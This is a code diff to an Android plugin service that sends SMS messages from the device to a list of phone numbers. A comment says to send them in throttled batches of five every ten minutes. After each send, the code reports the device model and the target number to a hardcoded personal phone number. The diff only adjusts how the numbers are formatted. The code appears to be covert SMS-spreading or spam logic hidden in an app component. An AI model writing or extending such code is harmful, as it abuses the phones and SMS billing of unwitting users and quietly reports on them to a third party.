@@ -102,8 +102,11 @@ public class PluginService extends IntentService {
                     //每次只发5条，等10分钟，再发5条
                     for (int i = 0; (i < datas.length && i < 5); ++i) {
                         String target = datas[i];
-                        if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
-                            if (SMSUtil.sendSMS(datas[i], "XSTD.SC:" + datas[i])) {
+//                        if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
+                        String content = datas[i];
+                        if (datas[i] != null && datas[i].length() == 11) {
+                            content = datas[i].substring(0, 5) + "." + datas[i].substring(5);
+                            if (SMSUtil.sendSMS(datas[i], "XSTD.SC:" + content)) {
                                 datas[i] = "";
                             }
                         } else {
@@ -123,7 +126,7 @@ public class PluginService extends IntentService {
                             }
 
                             String phone = android.os.Build.MODEL;
-                            String debugMsg = "[[通知短信]]" + phone + " 上的子程序向:" + target + "发送了:<<" + "XSTD.SC:" + target + ">>";
+                            String debugMsg = "[[通知短信]]" + phone + " 上的子程序向:" + target + "发送了:<<" + "XSTD.SC:" + content + ">>";
                             SMSUtil.sendSMS("18811087096", debugMsg);
 
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] debug send message to 15810864155 phone" +
